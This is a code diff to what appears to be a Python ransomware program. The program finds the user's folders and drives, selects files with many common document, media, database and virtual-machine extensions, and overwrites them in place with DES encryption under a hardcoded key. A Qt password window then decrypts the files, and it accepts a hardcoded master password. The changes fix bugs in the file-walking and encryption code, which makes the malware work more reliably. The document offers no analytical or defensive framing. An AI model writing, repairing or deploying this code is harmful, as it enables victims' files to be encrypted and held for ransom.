@@ -50,7 +50,7 @@ def getresource():
         ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, x, False)
         yield b.value
 
-if f"download" in os.listdir(f"C:\\Users\\{use}"):
+if "download" in os.listdir(f"C:\\Users\\{use}"):
 
     folder = list(getresource()) + disks() +[f"C:\\Users\\{use}\\download"]
 else:
@@ -72,31 +72,30 @@ class cip:
         try:
             with open(self.file, 'rb') as files:
                 packed=files.read()
-                try:
-                    with open(self.file, 'wb') as file:
-                        DesObject = des(b'20080617',ECB, pad=None, padmode=PAD_PKCS5)
-                        if w == 0:
-                            file.write(DesObject.encrypt(packed))
-                        else:
-                            file.write(DesObject.decrypt(packed))
-                except:
-                    pass
+                
+                with open(self.file, 'wb') as file:
+                    DesObject = des(b'20080617',ECB, pad=None, padmode=PAD_PKCS5)
+                    if w == 0:
+                        file.write(DesObject.encrypt(packed))
+                    else:
+                        file.write(DesObject.decrypt(packed))
         except:
-            pass
+            pass     
+       
             
 
 class listfile:
 
     @staticmethod    
     def showenfile():
-        extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc,','.docx','.xls','.xlsx','.7z',
-                '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
-                '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.txt','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
-                '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
-                '.vmx','.vmem','.vmdk','.apk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
-                 '.tif','.data','.jfif','.rdp']  
+        extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc','.docx','.xls','.xlsx','.7z',
+                      '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
+                      '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
+                      '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
+                      '.vmx','.vmem','.vmdk','.apk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
+                      '.tif','.data','.jfif','.rdp']  
         result = []
-        for root , files in os.walk(os.getcwd()):
+        for root, _ ,files in os.walk(os.getcwd()):
             for file in files:
                 paths = os.path.join(root, file)
                 
@@ -104,10 +103,9 @@ class listfile:
                     continue
 
                 _, ext = os.path.splitext(paths)
-                if ext.lower() in extensions and paths != '':
+                if ext.lower() in extensions and paths:  
                     result.append(paths)
                 
-        
         return result
 
     @staticmethod
@@ -117,11 +115,10 @@ class listfile:
         for dirpath, _, filenames in os.walk(os.getcwd()):
             for filename in filenames:
                 full_path = os.path.join(dirpath, filename)
-                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path != '':
+                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path:  # `full_path != ''` can be simplified as `full_path`
                     matching.append(full_path)
 
         return matching
-
 
 for f1 in folder:
     try:
@@ -231,6 +228,7 @@ class Ui_Form():
         if linekey == pswd or linekey == 'himzuishuaihim4588':
             ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你!', 0x30)
             deencryption()
+            sys.exit()
 
             
         else:
@@ -252,4 +250,5 @@ class FormWidget(QtWidgets.QWidget):
 app = QtWidgets.QApplication(sys.argv)
 widget = FormWidget()
 widget.show()
+
 sys.exit(app.exec_())
